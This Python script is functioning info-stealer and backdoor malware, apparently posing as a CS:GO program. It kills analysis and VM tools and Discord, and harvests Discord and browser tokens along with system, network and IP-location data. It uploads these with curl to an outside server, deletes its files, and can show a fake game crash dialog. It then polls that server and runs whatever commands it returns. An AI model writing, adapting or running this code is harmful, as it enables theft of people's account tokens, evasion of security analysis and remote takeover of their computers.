import time
import subprocess
import os
import re
import json
#import pyautogui
import urllib.request
import psutil

local = os.getenv("LOCALAPPDATA")
roaming = os.getenv("APPDATA")
temp = os.getenv("TEMP")

NotPSSW = []
login_info = os.getlogin()
computer_victim = os.getenv("COMPUTERNAME")

__config__ = {
    "sm": "%STEALTH_MODE_HERE%",
    "hide": "%HIDE_HERE%",
    "startUp": "%STARTUP_HERE%",
    "blprggg": [
        "httpdebuggerui",
        "wireshark",
        "fiddler",
        "regedit",
        "cmd",
        "taskmgr",
        "vboxservice",
        "df5serv",
        "processhacker",
        "vboxtray",
        "vmtoolsd",
        "vmwaretray",
        "ida64",
        "ollydbg",
        "pestudio",
        "vmwareuser",
        "vgauthservice",
        "vmacthlp",
        "x96dbg",
        "vmsrvc",
        "x32dbg",
        "vmusrvc",
        "prl_cc",
        "prl_tools",
        "xenservice",
        "qemu-ga",
        "joeboxcontrol",
        "ksdumperclient",
        "ksdumper",
        "joeboxserver",
    ],
}

async def kill_process_id(conf):
    bllist = conf.find_in_config("blprggg")
    for i in [
        "discord",
        "discordtokenprotector",
        "discordcanary",
        "discorddevelopment",
        "discordptb",
    ]:
        bllist.append(i)
    for proc in psutil.process_iter():
        if any(procstr in proc.name().lower() for procstr in bllist):
            try:
                proc.kill()
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                pass

def info_netword():
    req = urllib.request.urlopen("https://ipinfo.io/json")
    text = (req.read())
    text = json.loads(text)
    print(text)

    return(text)

# SYSTEM INFO
def sysinfo():
    Id = subprocess.check_output(['systeminfo']).decode('utf-8').split('\n')
    new = []
    nd = []
    
    for item in Id:
        new.append(str(item.split("\r")[:-1]))

    for i in new:
        line = i[2:-2]
        nd.append(line)

    df = open('system.dat','w')

    for i in nd:
        df.write(str(i))
        df.write('\n')

# NETWORK INFO
def netinfo():
    Id = subprocess.check_output(['ipconfig']).decode('utf-8').split('\n')
    new = []
    nd = []
    
    for item in Id:
        new.append(str(item.split("\r")[:-1]))

    for i in new:
        line = i[2:-2]
        nd.append(line)

    df = open('network.dat','w')

    for i in nd:
        df.write(str(i))
        df.write('\n')

#def screenshot(self):
#    myScreenshot = pyautogui.screenshot()
#    myScreenshot.save('screenshot.png')

def find_tokens(path):
    path += '\\Local Storage\\leveldb'

    tokens = []

    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue

        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in re.findall(regex, line):
                    tokens.append(token)
    return tokens

def discord():
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')

    paths = {
        'Discord': roaming + '\\Discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Discord PTB': roaming + '\\discordptb',
        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default',
        'Discord': roaming + '\\discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Lightcord': roaming + '\\Lightcord',
        'Discord PTB': roaming + '\\discordptb',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Opera GX': roaming + '\\Opera Software\\Opera GX Stable',
        'Amigo': local + '\\Amigo\\User Data',
        'Torch': local + '\\Torch\\User Data',
        'Kometa': local + '\\Kometa\\User Data',
        'Orbitum': local + '\\Orbitum\\User Data',
        'CentBrowser': local + '\\CentBrowser\\User Data',
        '7Star': local + '\\7Star\\7Star\\User Data',
        'Sputnik': local + '\\Sputnik\\Sputnik\\User Data',
        'Vivaldi': local + '\\Vivaldi\\User Data\\Default',
        'Chrome SxS': local + '\\Google\\Chrome SxS\\User Data',
        'Chrome': local + '\\Google\\Chrome\\User Data\\Default',
        'Chrome1': local + '\\Google\\Chrome\\User Data\\Profile 1',
        'Chrome2': local + '\\Google\\Chrome\\User Data\\Profile 2',
        'Chrome3': local + '\\Google\\Chrome\\User Data\\Profile 3',
        'Chrome4': local + '\\Google\\Chrome\\User Data\\Profile 4',
        'Chrome5': local + '\\Google\\Chrome\\User Data\\Profile 5',
        'Epic Privacy Browser': local + '\\Epic Privacy Browser\\User Data',
        'Microsoft Edge': local + '\\Microsoft\\Edge\\User Data\\Default',
        'Uran': local + '\\uCozMedia\\Uran\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Iridium': local + '\\Iridium\\User Data\\Default'
    }

    message = ''

    for platform, path in paths.items():
        if not os.path.exists(path):
            continue

        message += f'\n**{platform}**\n```\n'

        tokens = find_tokens(path)

        if len(tokens) > 0:
            for token in tokens:
                message += f'{token}\n'
        else:
            message += 'No tokens found.\n'

        message += '```'

    df = open('package.dat','w')
    df.write(str(message))


def upload():


    time.sleep(5)
    os.system(f'curl --form "file=@package.dat" "https://csgopower.eu/kronos/uploader.php?sup=discord&mId={computer_victim}"')
    os.system(f'curl --form "file=@system.dat" "https://csgopower.eu/kronos/uploader.php?sup=system&mId={computer_victim}"')
    os.system(f'curl --form "file=@network.dat" "https://csgopower.eu/kronos/uploader.php?sup=network&mId={computer_victim}"')
    os.system(f'curl --form "file=@location.dat" "https://csgopower.eu/kronos/uploader.php?sup=location&mId={computer_victim}"')


def clean():

    time.sleep(10)
    os.remove("system.dat")
    os.remove("network.dat")
    os.remove("location.dat")
    os.remove("package.dat")

def error():
    os.system("start steam://rungameid/730")
    time.sleep(25)
    os.system('taskkill /f /IM "steam.exe"')
    os.system('cscript vmi.vbs')

def create():
    computer_victim = os.getenv("COMPUTERNAME")
    url = f"https://csgopower.eu/kronos/get.php?mId={computer_victim}"
    urllib.request.urlopen(url)

def backdoor():

    computer_victim = os.getenv("COMPUTERNAME")

    url = f"https://csgopower.eu/kronos/get.php?mId={computer_victim}"

    req = urllib.request.urlopen(url)
    text = (req.read())
    text = json.loads(text)
    cmd = text['command']
    action = text['action']
    mId = text['mId']

    print(mId)
    print(cmd)
    print(action)

    if action != 'no':

        os.system(cmd)
        print("command has been performed")

    time.sleep(30)
    backdoor()

# START FUNCTIONS

kill_process_id(__config__)

create()

iploc = info_netword()
df = open('location.dat','w')
df.write(str(iploc))

# GENERATE ERROR

df = open('vmi.vbs','w')
df.write('error=msgbox("FATAL ERROR! CSGOS2.exe crashed:" & Chr(13) & Chr(10) & "Rendering thread exception:" & Chr(13) & Chr(10) & "An error at CSGOS2.exe!sub_14087AB89 (1xf0) caused CSGOS2 to stop working." & Chr(13) & Chr(10) & " " & Chr(13) & Chr(10) & "Stack trace:" & Chr(13) & Chr(10) & "    CSGOS2.exe!sub_14087AB89 (1xf0)"  & Chr(13) & Chr(10) & "    CSGOS2.exe!sub_1408AX369 (0x70)"  & Chr(13) & Chr(10) & "    CSGOS2.exe!sub_14087Z4AB (0x28)"  & Chr(13) & Chr(10) & "    CSGOS2.exe!sub_1408PO1AC (1x31)"  & Chr(13) & Chr(10) & "    CSGOS2.exe!sub_1408ECC2A (0x31)",16,"Engine Error")')


#TOKEN GRABBER DISCORD

discord()


#GET SYSTEM INFO

sysinfo()

#GET NETWORK INFORMATION

netinfo()

#TAKE SCREENSHOT

#screenshot()

# UPLOAD DATA

upload()
clean()

# BACKDOOR

backdoor()

#START CSGO WITH FAKE ERROR

#error()